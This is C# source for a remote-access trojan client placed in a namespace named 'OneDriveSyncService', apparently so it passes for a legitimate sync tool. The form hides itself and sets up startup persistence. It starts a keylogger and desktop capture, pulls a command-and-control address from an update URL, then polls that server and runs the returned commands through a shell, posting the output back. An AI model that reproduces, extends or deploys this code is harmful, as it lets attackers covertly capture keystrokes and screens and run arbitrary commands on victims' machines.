using System;
using System.Net;
using System.Windows.Forms;

namespace OneDriveSyncService
{
    public partial class Form1 : Form
    {
        private readonly WebClient _webClient;
        private readonly string _serverUpdate;
        private string _serverName;
        private string _status;

        public Form1(WebClient webClient, string serverUpdate)
        {
            _serverUpdate = serverUpdate;
            _webClient = webClient;
            InitializeComponent();
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            this.Hide();

            while (true)
            {
                try
                {
                    string name = Dns.GetHostName();
                    UpdateServerName();
                    Join.Startup();
                    Keylogger.InitClientKeylogger(_serverName);
                    ScreenCap.InitClientDesktop(_serverName);
                    _status = Join.JoinServer(_webClient, _serverName);

                    while (_status == "joined")
                    {
                        try
                        {
                            _webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                            string command = _webClient.UploadString(_serverName + "/command/server_command.php", "name=" + name);

                            if (command.Contains("message"))
                            {
                                string[] commandArgs = command.Split('"');
                                if (commandArgs.Length > 0)
                                {
                                    MessageBox.Show(commandArgs[1]);
                                }
                            }
                            else if (command.Contains("beep"))
                            {
                                Console.Beep(500, 10000);
                            }
                            else if (command.Contains("no_command"))
                            {
                                continue;
                            }
                            else if (command.Contains("startkeylog"))
                            {
                                Keylogger.StartKeylogger();
                            }
                            else if (command.Contains("stopkeylog"))
                            {
                                Keylogger.StopKeylogger();
                            }
                            else if (command.Contains("startdc"))
                            {
                                ScreenCap.StartDesktopCapture();
                            }
                            else if (command.Contains("stopdc"))
                            {
                                ScreenCap.StopDesktopCapture();
                            }
                            else
                            {
                                string returns = CMD.Execute(command);
                                _webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                                _webClient.UploadString(_serverName + "/command/output.php", "name=" + name + "&returns=" + returns);
                            }
                        }
                        catch
                        {

                        }
                        System.Threading.Thread.Sleep(5000);
                        _status = Join.JoinServer(_webClient, _serverName);
                    }
                }
                catch
                {

                }

                System.Threading.Thread.Sleep(5000);
            }
        }

        private void UpdateServerName()
        {
            string newHost = _webClient.DownloadString(_serverUpdate);
            _serverName = newHost;
        }
    }
}
